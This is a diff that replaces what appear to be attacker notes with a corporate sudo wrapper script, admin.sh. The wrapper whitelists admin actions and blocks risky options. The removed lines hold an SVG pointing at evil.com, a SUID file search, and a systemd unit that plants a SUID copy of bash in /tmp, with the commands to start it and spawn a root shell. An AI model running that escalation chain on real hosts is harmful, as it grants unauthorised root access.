@@ -1,53 +1,351 @@
+#!/bin/bash
 
-<svg xmlns="http://www.w3.org/2000/svg" width="800" height="600">
-  <foreignObject width="100%" height="100%">
-    <body xmlns="http://www.w3.org/1999/xhtml">
-      https://evil.com
-    </body>
-  </foreignObject>
-</svg>
+VERS_CMD="lsb_release -rs"
+command distro &>/dev/null && VERS_CMD="distro -j | jq -r '.version'"
+umask 0022
+# Export PATH 
+PATH="/sbin:/bin:/usr/sbin:/usr/bin:/usr/local/sbin:/usr/local/bin:/opt/puppetlabs/bin"
+export PATH
+# Enable extended globbing for the script.
+shopt -s extglob
 
+function help () {
+        P1="$1"
+        [ -n "$P1" ] && shift;
+        case "$P1" in
+                empower) /prod/BOSU/scripts/"${P1}".sh help ${@:+"$@"};;
+                *) cat <<EOF
 
-find / -perm -u=s -type f 2>/dev/null
+More information can be found at this page:
+https://confluence.axa.com/confluence/x/xqz6Eg
 
+The following sections (or modules) are implemented:
 
+ad :            Active Directory join or leave local GRAD
+audit :         see "internal_audit"
+cert :          calls the "cert_manage" scripts to generate a new CSR (if called with no arguments)
+                or take another parameter : the new certificate to replace the current one.
+createfs:       will create a new FS using: sudo admin.sh createfs /path_to_new_filesystem Size vgname 
+                Size  = Size default MEGA (or GIGA with G ex: 1G) help: sudo admin.sh createfs 
+clean :         will pass all arguments to the /prod/BOSU/script/clean.sh command
+crudini :       modify an "ini"-style configuration file
+diskInfo :      takes the name of a LV and tries to give the list of the physical volumes beneath
+edit :          gives direct access to some files (set the EDITOR env variable to change the viewer)
+empower :       manage service account rights (manage a service account to a local group, granting the permission to reboot,sudosu)
+extendFS :      calls the /prod/BOSU/scripts/extendFS.sh script with the parameters you give (try -h)
+extendVG :      calls the /prod/BOSU/scripts/extendVG.sh script with the parameters you give (try -h)
+flushdns :      calls the clean.sh flushdns command to invalidate the objects in the local DNS cache;
+                it can also be called using: sudo $0 clean flushdns
+fs :            manage applicative filesystems by launching the admin_menu.sh command
+fstab :         to manually add/remove lines in the /etc/fstab (but only the ones that are about NFS or CIFS shares) using: sudo admin.sh fstab
+infos :         information on GRAD, User, Groups
+internal_audit: will run /prod/BOSU/scripts/internal_audit.sh for producing the Internal Audit report
+jmap :          calls /prod/BOSU/scripts/jmap.sh to get a heapdump of a Java virtual machine
+keytabs :       creates a user keytab interactively
+menu :          calls /prod/BOSU/scripts/admin_menu.sh
+newdisk :       will configure newdisk for MPI:  sudo admin.sh newdisk --help
+                sudo admin.sh newdisk [DISK_SIZE_GB] [FILESYSTEM_TYPE] [MOUNT_POINT] [VOLUME_GROUP] [OWNER] [GROUP_OF_OWNER]
+passwdalgo :    gives a list of the non-system accounts (+ root) and
+                the encryption algorithm used for locally stored password
+                in the shadow database
+vormetric :     will check vormetric agent health, status and version 
+patch :         will start the Patch Management process (and reboot the computer) "NOW"
+puppet :        will start a puppet run by launching the following command : puppet agent -t
+                        you can also use: "sudo admin.sh puppet --noop" for a dry run
+poweroff :      see "halt"
+reboot :        will reboot the computer "NOW"
+halt :          will poweroff the computer "NOW"
+tail :          see "tailf"
+tailf :         take one of the following names as parameter: 'messages', 'secure', 'httpd', 'cron', or 'audit'
+                and then you'll get, e.g., if using : sudo admin.sh tailf messages ; a "tail -F /var/log/messages"
+cat :           take one of the following names as parameter: 'messages', 'secure', 'httpd', 'cron', or 'audit'
+                and then you'll get, e.g., if using : sudo admin.sh cat messages ; a "cat /var/log/messages"
+zcat :          take one of the following names as parameter: 'messages', 'secure', 'httpd', 'cron', or 'audit'
+                and then you'll get, e.g., if using : sudo admin.sh zcat messages ; a "zcat /var/log/messages*gz"
 
+trust_new_signing_ca : special command to add the new intermediate CA certificates (the ones which will expire in 2034) in the local truststore (should be avoided unless absolutely necessary)
+untrust_new_signing_ca: special command to remove the new intermediate CA certificates (the ones which will expire in 2034) from the local truststore (since it shouldn't be necessary to trust them)
 
+The following commands are relevant for Oracle database and Oracle client systems:
 
-cat > /dev/shm/root.service <<'EOF'
-[Unit]
-Description=roooooooooot
+oracle_client:              will call the oracle_client script, must be used with one of four parameters
+                            -s shows status of the client
+                            -i installs the client
+                            -u updates the client
+                            -r removes the client
+oracle_pre_patching_checks: Perform the prerequisite checks for Oracle patching.
+rollback_oracle_patches:    will call the Oracle RU/OJVM/JDK rollback script for one Oracle Home to provide.
+                            Be careful as this will shutdown the Oracle databases concerned.
 
-[Service]
-Type=simple
-User=root
-ExecStart=/bin/bash -c 'cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash'
+The following commands directly call the system binary.
+Arguments (with some filters/limitations) will be passed to the actual command.
 
-[Install]
-WantedBy=multi-user.target
+alternatives         | same as update-alternatives
+chkconfig            | mount / umount
+service              | mkhomedir (mainly for creating svc_scheduling homedir)
+sosreport|sos        | fsck / resize2fs / xfs_growfs
+                     | facter (the puppet component that collects and displays properties)
+ip                   | restorecon
+lvs|vgs|pvs          | kill (and killall)
+journalctl           | lsof
+                     | semanage port|boolean|fcontext
+                                         | (note that this lists *all* regular expressions registered in SELinux
+                                         | (pipe the results to grep as appropriate) and allows viewing only, not modifying)
+systemctl            | netstat
+tcpdump              | salt-call
+update-alternatives  | yum
+
+The edit subcommand gives the ability to directly modify some files. To
+get the current list of authorized files, type the following command:
+
+grep -vE '^(#|$)' /prod/BOSU/conf/admin.* 2>/dev/null
+
+Therefore, you will be able to edit one of these files by doing:
+
+sudo $0 edit /etc/fstab
+
+for files that have an "ini"-style format (e.g. /prod/BOSU/conf/admin.ini),
+you can replace "edit" by "crudini" to be able to use crudini instead of editing the file
+if you prefer.
+
+sudo $0 crudini --set /etc/sysctl.d/local.conf "" net.ipv4.conf.all.log_martians 1
+sudo $0 crudini --del /etc/pki/tls/openssl.cnf alt_names DNS.1
+
+If you find a bug or need a new feature, contact an AXA GO Linux system administrator.
+
 EOF
 
+;; esac
+exit 0
+}
 
+# Check if the protected_services.conf file exists and is not empty.
+if [ -s /prod/BOSU/conf/protected_services.conf ] ; then
+        PROTECTED_SERVICES="$(xargs < /prod/BOSU/conf/protected_services.conf | sed -re 's/[[:space:]]*$//' -e 's/[[:space:]]+/|/g')"
+else
+    echo 'Configuration file /prod/BOSU/conf/protected_services.conf missing.'
+    echo 'Please contact a system administrator as this is not normal.'
+    exit 254
+fi
 
+# If no arguments are provided, call the 'help' function.
+[ "$#" -eq 0 ] && help
 
+# If not running as root, warn about the lack of 'sudo' and exit.
+# Note: the "0" after "2>/dev/null)" is not a typo. It ensures that,
+# if the command result is an empty string, the comparison is done against "0"
+# (instead of "", which would cause an error)
+[ "$(id -u 2>/dev/null)0" -ne 0 ] && echo "ERROR: admin.sh must be run with sudo." && exit 2
 
-# then
-/bin/systemctl enable /var/tmp/root.service
-/bin/systemctl start root
-/tmp/rootbash -p
+# Get the action and verb from the command line.
+ACTION="$(echo "$1" | tr '[:upper:]' '[:lower:]')"
+shift
+VERBE="$1"
+shift
 
+# An $ACTION can be either a script in /prod/BOSU/scripts (handled outside the 'case' statement) or one of the following.
+# Note that each case statement ends with an 'exit', so if one of them matches, no script is executed afterwards.
+case "$ACTION" in
+        cert?(_manage)) /prod/BOSU/scripts/cert_manage.sh "$VERBE" ${@:+"$@"} ; exit 0 ;;
+        crudini) for i in $(grep -vE '^(#|$)' /prod/BOSU/conf/admin.ini | xargs ) ; do
+                        echo "${@}" | grep -qE -- "${i}[[:space:]]+" && (/usr/bin/crudini "$VERBE" "${@}" ; exit 0)
+                done ; exit 0;;
+        diskinfo) /prod/BOSU/scripts/diskInfo.sh ${VERBE:+"$VERBE"} ; exit 0 ;;
+        empower) if [ -z "$VERBE" ] ; then /prod/BOSU/scripts/admin_menu.sh "$ACTION" ; exit 0 ; else case "$VERBE" in
+                add|del) [ "$#" -ne 2 ] && help "$ACTION" "$VERBE" ;;
+                esac ; fi ;;
+        edit) if echo "${VERBE:+"$VERBE"}" | grep -qE "^[[:space:]]*$" || echo "${VERBE:+"$VERBE"}" | grep -qE "^[[:space:]]*[^/]+[[:space:]]*$" ; then
+                        echo "Files you are allowed to edit: " &&  grep -vE '^(#|$)' /prod/BOSU/conf/admin.* 2>/dev/null | cut -d: -f2
+                        else
+                        echo "Checking you'are allowed to edit the file ... if nothing happens, please check you are by running sudo admin.sh edit"
+            su - "$SUDO_USER" -c "sudo -e $( readlink -fn ${VERBE:+"$VERBE"}) 2>/dev/null && clear && echo "Edition was possible... done" || exit $?"
+                        [ "$?" -ne 0 ] && echo "Files you are allowed to edit: " &&  grep -vE '^(#|$)' /prod/BOSU/conf/admin.* 2>/dev/null | cut -d: -f2
+                fi
+        exit 0;;
+        createfs) [ -x /prod/BOSU/scripts/"${ACTION}".sh ] && /prod/BOSU/scripts/"${ACTION}".sh ${VERBE:+"$VERBE"} ${@:+"$@"} ; exit 0 ;;
+        extendfs|extendvg) [ "${ACTION}" = "extendfs" ] && SCRIPT=extendFS || SCRIPT=extendVG ; /prod/BOSU/scripts/"${SCRIPT}".sh ${VERBE:+"$VERBE"} ${@:+"$@"} ; exit 0 ;;
+        flushdns) /prod/BOSU/scripts/clean.sh "${ACTION}" ; exit 0 ;;
+        facter) [ -x /opt/puppetlabs/bin/facter ] && if echo " ${VERBE} $@" | grep -qE -- '-c|--external-dir' ; then echo "ERROR: parameters '-c' or '--external-dir' are not allowed." ; else /opt/puppetlabs/bin/facter ${VERBE:+"$VERBE"} ${@:+"$@"} ; fi ; exit 0 ;;
+        fsck|resize2fs|xfs_growfs|lvs|vgs|pvs) /sbin/"$ACTION" ${VERBE:+"$VERBE"} ${@:+"$@"}  ; exit 0 ;;
+        halt|poweroff) /prod/BOSU/scripts/schedreboot.sh -halt ; exit 0 ;;
+        ?(internal_)audit) /prod/BOSU/scripts/internal_audit.sh ; exit 0;;
+        ip) if echo " ${VERBE} $@ " | grep -qEi -- "netns|batch" ; then echo "ERROR: parameters '--netns' or '--batch' are not allowed." ; exit 196 ; else /sbin/ip ${VERBE:+"$VERBE"} ${@:+"$@"} ; fi  ; exit 0 ;;
+        jmap)   /prod/BOSU/scripts/jmap.sh ${VERBE:+"$VERBE"} ${@:+"$@"} ; exit 0 ;;
+        journalctl) /bin/journalctl --no-pager ${VERBE:+"$VERBE"} ${@:+"$@"}  ; exit 0 ;;
+        keytabs) /prod/BOSU/scripts/"${ACTION}" ${VERBE:+"$VERBE"} ${@:+"$@"} ; exit 0 ;;
+        netstat) /bin/"${ACTION}" ${VERBE:+"$VERBE"} ${@:+"$@"}  ; exit 0 ;;
+        ?(configure_)newdisk) /usr/local/bin/configure_newdisk.sh ${VERBE:+"$VERBE"} ${@:+"$@"} ; exit 0 ;;
+        passwdalgo)
+                echo ""
+                echo -n "Current algorithm for local password encryption configured is : " ; grep PASSWDALG /etc/sysconfig/authconfig | cut -d= -f2
+                echo ""
+                >&2 cat <<EOF
+Below is the list of non-system users (including root) and the encryption algorithm used.
+Documentation:
+http://man7.org/linux/man-pages/man5/shadow.5.html
+http://man7.org/linux/man-pages/man3/crypt.3.html
 
+EOF
+                if eval "$VERS_CMD" | grep -qE "^[789]" ; then
+                        for user in root $(awk -F: '($3 >= 1000) {print $1 }' /etc/passwd) ; do
+                                grep -- "^$user:" /etc/shadow | sed -r "s/^$user:(..).*/$user:\1/"
+                        done
+                else
+                        for user in root $(awk -F: '($3 >= 500) {print $1 }' /etc/passwd) ; do
+                                grep -- "^$user:" /etc/shadow | sed -r "s/^$user:(..).*/$user:\1/"
+                        done
+                fi
+        exit 0 ;;
+        mkhomedir?(_helper)) /sbin/mkhomedir_helper ${VERBE:+"$VERBE"} 0077 ; exit 0;;
+        menu) /prod/BOSU/scripts/admin_menu.sh ${VERBE:+"$VERBE"} ; exit 0 ;;
+        ?(u)mount) if echo "${VERBE} $@" | grep -E -qi -- 'bind' ; then echo "Bind mounts are not permitted here; please contact a system administrator if you really need one." ; exit 0 ; else  /bin/"$ACTION" ${VERBE:+"$VERBE"} ${@:+"$@"} ; fi ; exit 0 ;;
+        service|chkconfig|restorecon)
+                case "$ACTION" in
+                        service|chkconfig)
+                                if echo "${VERBE} $@" | grep -qiE -- '/' ; then
+                                        echo "ERROR: Service names cannot contain slashes ('/')."
+                                        exit 194
+                                fi
+                                if echo "${VERBE} $@" | grep -qEi "(${PROTECTED_SERVICES})[[:space:]]+stop[[:space:]]*$" ; then
+                                        echo "ERROR: protected services (including Puppet, Qualys agent, and EDR) cannot be stopped or disabled."
+                                        exit 194
+                                fi
+                        ;;
+                esac
+                /sbin/"$ACTION" ${VERBE:+"$VERBE"} ${@:+"$@"}
+                exit $?
+        ;;
+        systemctl) case ${VERBE:+"$VERBE"} in
+        edit|link)
+                echo "ERROR: the $VERBE subcommand is restricted. Please contact a system administrator."
+            exit 195
+        ;;
+        stop|disable)
+            if echo ${@:+"$@"} | grep -qEi "(${PROTECTED_SERVICES})(\.service)?" ; then
+                echo "ERROR: protected services (including Puppet, Qualys agent, and EDR) cannot be stopped or disabled."
+                exit 195
+            fi
+        ;;
+        -*)
+            if echo ${@:+"$@"} | grep -qEi "\b(edit|link|((${PROTECTED_SERVICES})(\.service)?))\b" ; then
+                echo "ERROR: command not allowed. Please contact the Linux team if you need more explanations and provide them a screen capture."
+                exit 195
+            fi
+        ;;
+        esac
+        echo ${@:+"$@"} | grep -q "/" && echo "ERROR: Service names cannot contain slashes ('/')." && exit 195
+        /bin/"$ACTION" --no-pager ${VERBE:+"$VERBE"} ${@:+"$@"}
+        exit $?
+    ;;
+    vormetric)
+    # Check if vormetric agent is present
+                 if  [ ! -e "/opt/vormetric/DataSecurityExpert/agent/vmd/bin/agenthealth" ]  ; then
+                                echo "ERROR: Check agenthealth is not existing. Please contact a system administrator"
+                                exit 0;
+                 else
+                         case "$VERBE" in
+                                 status)
+                                        /opt/vormetric/DataSecurityExpert/agent/vmd/bin/agenthealth ; /etc/vormetric/secfs status ;;
+                                 version)
+                                         /opt/vormetric/DataSecurityExpert/agent/vmd/bin/vmd -v ;;
+                                 *) echo -e "ERROR: please use one of the allowed parameters: 'status', 'version'" ;;
+                                 esac
+                 fi
+                 exit 0;;
+        patch) /prod/BOSU/scripts/schedreboot.sh -patch ; exit 0;;
+        puppet) echo " ${VERBE} $@ " | grep -qE -- '[[:space:]]+--noop' && OPTS="--noop"
+                echo "Puppet started using the following command : puppet agent -t $OPTS"
+                /usr/local/bin/puppet agent -t ${OPTS:+"$OPTS"} ; exit 0;;
+        reboot) /prod/BOSU/scripts/schedreboot.sh ; exit 0 ;;
+        kill?(all)|salt-call|lsof) /usr/bin/"$ACTION" ${VERBE:+"$VERBE"} ${@:+"$@"} ; exit 0 ;;
+        #openssl) if echo " ${VERBE} $@ " | grep -Eqi -- 's_client' ; then echo "Sorry, some options are not authorized to be used such as s_client" ; exit 193 ; else /usr/bin/$ACTION ${VERBE} $@ ; fi; exit 0 ;;
+        sos|sosreport)  /usr/sbin/sosreport --batch ${VERBE:+"$VERBE"} ${@:+"$@"} && [ -n "${SUDO_USER}" ] && (/bin/chown "${SUDO_USER}" /tmp/sosreport-*-"$(date +%Y-%m-%d)"* 2>/dev/null ||  /bin/chown "${SUDO_USER}" /var/tmp/sosreport-*-"$(date +%Y-%m-%d)"* 2>/dev/null); exit 0;;
+        trust_new_signing_ca) cd /etc/pki/ca-trust/source/anchors || { echo "ERROR: Couldn't cd to /etc/pki/ca-trust/source/anchors"; exit 1; }; for i in ../../../tls/certs/*PR?_2034.crt ; do [ -e "$i" ] && ln -sf "$i" . ; done && (update-ca-trust force-enable; update-ca-trust extract ; echo "Done" ) || echo "Nothing changed, please review with a system admin" ; exit $? ;;
+        untrust_new_signing_ca) cd /etc/pki/ca-trust/source/anchors || { echo "ERROR: Couldn't cd to /etc/pki/ca-trust/source/anchors"; exit 1; }; for i in *PR?_2034.crt ; do [ -e "$i" ] && rm -f "$i" ; done && (update-ca-trust force-enable; update-ca-trust extract ; echo "Done") || echo "Nothing changed" ; exit $? ;;
+        tail?(f)) case ${VERBE:+"$VERBE"} in
+                audit?(d)) /usr/bin/tail -F /var/log/audit/audit.log;;
+                message?(s)) /usr/bin/tail -F /var/log/messages ;;
+                secure) /usr/bin/tail -F /var/log/secure ;;
+                cron) /usr/bin/tail -F /var/log/cron ;;
+                http?(d)) /usr/bin/tail -f /var/log/httpd/*log ;;
+                *) echo -e "ERROR: please use one the allowed files: 'audit', 'messages', 'secure', 'cron', or 'httpd'; for example:\n sudo admin.sh tailf audit " ;;
+                esac ; exit 0 ;;
+        cat) case ${VERBE:+"$VERBE"} in
+                audit?(d)) /usr/bin/cat /var/log/audit/audit.log;;
+                message?(s)) /usr/bin/cat /var/log/messages ;;
+                secure) /usr/bin/cat /var/log/secure ;;
+                cron) /usr/bin/cat /var/log/cron ;;
+                http?(d)) /usr/bin/cat /var/log/httpd/*log ;;
+                *) echo -e "ERROR: please use one of the allowed files: 'audit', 'messages', 'secure', 'cron', or 'httpd'; for example:\n sudo admin.sh cat audit " ;;
+                esac ; exit 0 ;;
+        zcat) case ${VERBE:+"$VERBE"} in
+                audit?(d)) /usr/bin/zcat -f /var/log/audit/audit.log?*;;
+                message?(s)) /usr/bin/zcat -f /var/log/messages?* ;;
+                secure) /usr/bin/zcat -f /var/log/secure?* ;;
+                cron) /usr/bin/zcat -f /var/log/cron?* ;;
+                http?(d)) /usr/bin/zcat -f /var/log/httpd/*log?* ;;
+                *) echo -e "ERROR: please use one of the allowed files: 'audit', 'messages', 'secure', 'cron', or 'httpd'; for example:\n sudo admin.sh zcat audit " ;;
+                esac ; exit 0 ;;
+        semanage)
+                case ${VERBE:+"$VERBE"} in
+                        port|boolean|fcontext)
+                                /usr/sbin/"${ACTION}" ${VERBE:+"$VERBE"} -l
+                                ;;
+                        "")
+                                echo "ERROR: semanage requires a subcommand. Valid subcommands are: 'port', 'fcontext', or 'boolean'."
+                                exit 1
+                                ;;
+                        *)
+                                echo "ERROR: semanage subcommand not allowed. Valid subcommands are: 'port', 'fcontext', or 'boolean'."
+                                exit 1
+                                ;;
+                esac
+                exit 0
+                ;;
+        tcpdump) if echo " ${VERBE} $@ " | grep -qE -- '[[:space:]]+-[^[:space:]]*z' ; then echo "ERROR: the '-z' tcpdump option is not allowed." ; exit 197; else /usr/sbin/tcpdump ${VERBE:+"$VERBE"} ${@:+"$@"} ; fi ; exit 0 ;;
+        ?(update-)alternatives) echo " ${VERBE} $@ " | grep -E -q '[[:space:]]+--(install|remove)[[:space:]]+' && echo "ERROR: install/remove are not allowed." || /usr/sbin/"${ACTION}" ${VERBE:+"$VERBE"} ${@:+"$@"} ; exit 0 ;;
+        yum)
+                # prevent downgrade/erase/remove of protected services
+                if echo " ${VERBE} $@" | grep -qE -i -- "(erase|remove|downgrade).*(${PROTECTED_SERVICES})" ; then
+                        echo "ERROR: Downgrading, erasing, or removing protected services is not allowed."
+                        exit 195;
+                # prevent use of unauthorized options
+                elif echo " ${VERBE} $@ " | grep -E -q -e '[[:space:]]+--?c(onfig)?[[:space:]]+' -e '[[:space:]]+--(no)?((disable)?plugins?|gpgcheck|skip-broken|setopt=)[[:space:]]*' ; then
+                        echo "ERROR: Some yum options, including '--skip-broken' or '--config', are not permitted. Please ask a system administrator for help.";
+                        exit 198;
+                # prevent use of RPM filenames
+                elif echo " ${VERBE} $@ " | grep -qi '\.rpm\b' ; then
+                        echo "ERROR: Installing, updating, or downgrading using an RPM filename is not allowed. Please use a package name or contact a system administrator for assistance."
+                        exit 199;
+                else
+                        case "$VERBE" in
+                                addexclude)
+                                        echo "ERROR: this sub-command is still to be developed. Please contact a system administrator." ;;
+                                delexclude)
+                                        crudini --del /etc/yum.conf "main" exclude ;;
+                                listexclude)
+                                        crudini --get /etc/yum.conf main exclude ;;
+                                *) /usr/bin/yum ${VERBE:+"$VERBE"} ${@:+"$@"} ;;
+                        esac
+                fi
+                exit 0 ;;
+esac
 
+# If we got here, then the 'case' statement didn't match, so we'll try to run a script "$ACTION.sh" in /prod/BOSU/scripts.
+# First we check for any slashes or '..' in the ACTION, as a security measure.
+if [[ "$ACTION" == *"/"* || "$ACTION" == *".."* ]]; then
+        echo "ERROR: the first parameter to admin.sh cannot contain a slash ('/') or '..'."
+        exit 1
+fi
+# Now execute the script, if it exists.
+if [ -x /prod/BOSU/scripts/"${ACTION}".sh ]; then
+        if ! /prod/BOSU/scripts/"${ACTION}".sh "$VERBE" ${@:+"$@"}; then
+                echo -e "\nERROR: The script for the action '${ACTION}' failed.\nPlease contact a system administrator.\n"
+                exit 2
+        fi
+else
+        echo -e "\nERROR: Action '${ACTION}' not supported.\nPlease contact a system administrator.\n"
+        exit 2
+fi
 
-
-
-[Unit]
-Description=roooooooooot
-
-[Service]
-Type=simple
-User=root
-ExecStart=/bin/bash -c 'cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash'
-
-[Install]
-WantedBy=multi-user.target
+exit 0
